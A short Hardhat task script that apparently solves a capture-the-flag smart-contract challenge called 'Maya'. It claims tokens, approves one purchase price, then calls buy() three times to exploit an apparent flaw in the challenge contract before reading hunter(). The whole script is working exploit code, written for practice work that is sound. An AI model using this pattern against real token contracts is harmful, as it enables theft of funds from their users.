import { task, types } from "hardhat/config";
import { HardhatRuntimeEnvironment, TaskArguments } from "hardhat/types";
import { Maya, MERC20 } from "../typechain";

task("solveMaya", "Solves the Maya challenge")
    .addParam("mayaAddress", "Address of the Maya contract", undefined, types.string, false)
    .setAction(async (args: TaskArguments, hre: HardhatRuntimeEnvironment) => {
        if (!hre.ethers.utils.isAddress(args.mayaAddress)) {
            throw new Error(`Invalid contract address format: ${args.mayaAddress}`);
        }

        const signers = await hre.ethers.getSigners();

        // Use a different signer from the local deployer so we can test properly
        let signer;
        if (hre.network.name === "hardhat" || hre.network.name === "localhost") {
            signer = signers[1];
        } else {
            signer = signers[0];
        }

        const MayaFactory = await hre.ethers.getContractFactory("Maya", signer);
        const mayaChallenge = (await MayaFactory.attach(args.mayaAddress)) as Maya;

        const MERC20Factory = await hre.ethers.getContractFactory("MERC20", signer);

        console.log("Getting the token contract address...");
        const merc20TokenAddress = await mayaChallenge.token();

        console.log("Found MERC20 token at address:", merc20TokenAddress);
        const merc20Challenge = (await MERC20Factory.attach(merc20TokenAddress)) as MERC20;

        // Get some tokens
        console.log("Getting some tokens...");
        let tx = await merc20Challenge.getTokens();
        await tx.wait();

        // Buy a maya
        const price = await mayaChallenge.price();

        console.log("Approve Maya contract to spend tokens...");
        tx = await merc20Challenge.approve(mayaChallenge.address, price);
        await tx.wait();

        console.log("Buying a Maya...");
        tx = await mayaChallenge.buy();

        await tx.wait();

        console.log("Buying a second Maya...");
        tx = await mayaChallenge.buy();
        await tx.wait();

        console.log("Now a third!");
        tx = await mayaChallenge.buy();
        await tx.wait();

        const result = await mayaChallenge.hunter();

        console.log("[RESULT]:", result);
    });
